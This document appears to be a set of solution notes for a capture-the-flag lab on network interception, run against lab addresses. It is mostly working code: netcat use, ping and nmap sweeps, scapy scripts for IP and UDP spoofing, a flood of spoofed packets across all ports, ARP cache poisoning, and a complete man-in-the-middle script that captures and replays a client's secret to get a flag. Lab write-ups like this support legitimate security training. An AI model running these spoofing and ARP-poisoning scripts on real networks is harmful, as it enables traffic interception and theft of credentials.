# Intercepting Communication

##  Connect

```bash
nc 10.0.0.1 31337
```


## Send

```bash
nc 10.0.0.1 31337
Hello, World!
```


## Shutdown

`-N` sends a EOF through nc to say its finished sending.

```bash
nc -N 10.0.0.1 31337
```


## Listen

Listen for incoming connections using `-l`

```bash
nc -l 10.0.0.1 31337
```


## Scan 1

Grep for successful ping:

```bash
for i in {10..254};
    do ping -c 1 -W 1 10.0.0.$i &
done | grep "1 rec" -B 1
```

Send all output to null, then at success echo the ip:

```bash
for i in {10..254}; do
    ping -c 1 -W 1 10.0.0.$i > /dev/null && echo "10.0.0.$i is alive" &
done
```

Then nc that ip:

```bash
nc 10.0.0.$i
```


## Scan 2

Listen for incoming connections using `-l`


```bash
nmap -Pn -p 31337 --open -T5 -n 10.0.0.0/16
```


## Ethernet

```py
from scapy.all import Ether, sendp

eth_frame = Ether(
    dst="ff:ff:ff:ff:ff:ff",
    src="00:11:22:33:44:55",
    type=0xFFFF
)

sendp(eth_frame, iface="eth0")
```


## IP

```py
from scapy.all import IP, send

packet = IP(
    dst="10.0.0.2",
    proto=0xFF
)

send(packet)
```


## TCP

```py
from scapy.all import IP, TCP, send

packet = IP(src="10.0.0.1", dst="10.0.0.2") / TCP(sport=31337, dport=31337, seq=31337, ack=31337, flags="APRSF")

send(packet)
```


## TCP Handshake

```py
from scapy.all import IP, TCP, send

packet = IP(src="10.0.0.1", dst="10.0.0.2") / TCP(sport=31337, dport=31337, seq=31337, ack=31337, flags="APRSF")

send(packet)
```


## UDP 1

```py
from pwn import *

io = remote('10.0.0.2', 31337, typ='udp')

io.send(b"Hello, World!\n")

io.interactive()
```


## UDP 2

```py
import socket

with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
    sock.bind(("0.0.0.0", 31338))
    sock.settimeout(5)  # optional timeout

    sock.sendto(b"Hello, World!\n", ("10.0.0.2", 31337))

    try:
        data, addr = sock.recvfrom(1024)
        print(f"Received from {addr}: {data}")
    except socket.timeout:
        print("No response received.")
```


## UDP Spoofing 1

```py
from scapy.all import IP, UDP, send

packet = (
    IP(src="10.0.0.3", dst="10.0.0.2") /
    UDP(sport=31337, dport=31338) /
    b"FLAG"
)

send(packet)
```


## UDP Spoofing 2

```py
from scapy.all import IP, UDP, send

packet = (
    IP(src="10.0.0.3", dst="10.0.0.2") /
    UDP(sport=31337, dport=31338) /
    b"FLAG:10.0.0.1:31337"
)

send(packet)
```


## UDP Spoofing 3

```py
'from scapy.all import sniff, UDP, IP, send
import threading
import time

LISTEN_PORT = 31337

def udp_listener(packet):
    if UDP in packet and packet[UDP].dport == LISTEN_PORT:
        payload = bytes(packet[UDP].payload)
        try:
            payload_str = payload.decode()
        except UnicodeDecodeError:
            payload_str = repr(payload)
        print(f"Received packet from {packet[IP].src}:{packet[UDP].sport} -> {payload_str}")

# Listener thread
listener_thread = threading.Thread(
    target=lambda: sniff(filter=f"udp port {LISTEN_PORT}", prn=udp_listener, store=False)
)
listener_thread.daemon = True
listener_thread.start()
print(f"Listening for UDP packets on port {LISTEN_PORT}...")

# Function to send a packet to a port
def send_packet(dst_port):
    packet = IP(src="10.0.0.3", dst="10.0.0.2") / UDP(sport=31337, dport=dst_port) / b"FLAG:10.0.0.1:31337"
    send(packet, verbose=False)

# Give listener a moment to start
time.sleep(1)

# Send packets on separate threads
threads = []
for port in range(0, 65535):
    t = threading.Thread(target=send_packet, args=(port,))
    t.start()
    threads.append(t)

for t in threads:
    t.join()

# Keep listener alive
try:
    while True:
        time.sleep(1)
        print("done")
except KeyboardInterrupt:
    print("Stopping listener.")
```

The above also works for `UDP Spoofing 4`.


## ARP

```py
from scapy.all import ARP, send

arp_packet = ARP(
    hwsrc="42:42:42:42:42:42",   # Source MAC (your machine's MAC)
    psrc="10.0.0.42",            # Source IP
    hwdst="ff:ff:ff:ff:ff:ff",   # Destination MAC (broadcast for request)
    pdst="10.0.0.2",             # Destination IP
    op=2                         # 1 = ARP request, 2 = ARP reply
)

send(arp_packet)
```


## Intercept

Set own ip to 10.0.0.3

```py
from scapy.all import sendp, Ether, ARP
from pwn import listen

sendp(
    Ether(src="62:8e:aa:28:57:44", dst="ff:ff:ff:ff:ff:ff") /
    ARP(op="is-at", psrc="10.0.0.3", hwsrc="62:8e:aa:28:57:44")
)

print(listen(31337).recvrepeat())
```


## Man-in-the-middle

To be the man in the middle, the server needs to think *you* are the client, and the client needs to think you are the server. To achieve this I first spoofed the server to get the clients secret, then the client. However, since the secret regenerates when we connect, I first had to create a session as the client, to use next time I connect:

```py
from scapy.all import *
import socket
import os

def spoof(your_mac, ip_to_imitate, mac_to_trick):
    # Set IP
    os.system(f"ip addr flush dev eth0")
    os.system(f"ip addr add {ip_to_imitate}/24 dev eth0")
    sendp(
        Ether(src=your_mac, dst=mac_to_trick) /
        ARP(op="is-at", psrc=ip_to_imitate, hwsrc=your_mac),
        verbose = False
    )

def get_mac(ip):
    os.system(f"ping -c 1 -W 1 {ip} > /dev/null 2>&1")
    result = os.popen(f"arp -a {ip}").read()
    for line in result.splitlines():
        if ip in line:
            return line.split()[3]
    return None
    
# SET CONSTANTS AND GET MAC
IP_client = "10.0.0.2"
IP_server = "10.0.0.3"

MAC = get_if_hwaddr("eth0")
MAC_server = get_mac(IP_server)
MAC_client = get_mac(IP_client)


# Spoof client to get a session, so the secret doesn't regenerate next time we connect.
print("Spoofing client:")
spoof(MAC, IP_client, MAC_server)

client_socket = socket.socket()
client_socket.connect(("10.0.0.3", 31337))

print(client_socket.recv(1024))


# Spoof server to steal the clients secret
print("Spoofing server:")
spoof(MAC, IP_server, MAC_client)

server_socket = socket.socket()
server_socket.bind(("0.0.0.0", 31337))
server_socket.listen()
print("Waiting for client to connect to spoofed server ...")
connection, _ = server_socket.accept()
print("connected")
connection.sendall(b"secret: ")
secret = connection.recv(1024)
print("Got secret:", secret)


# Spoof client
print("Spoofing client:")
spoof(MAC, IP_client, MAC_server)

print("Pass caught secret to auth")
client_socket.sendall(secret)
print("Run 'flag' command")
client_socket.recv(1024)
client_socket.sendall(b"flag")
print(client_socket.recv(1024).decode())
```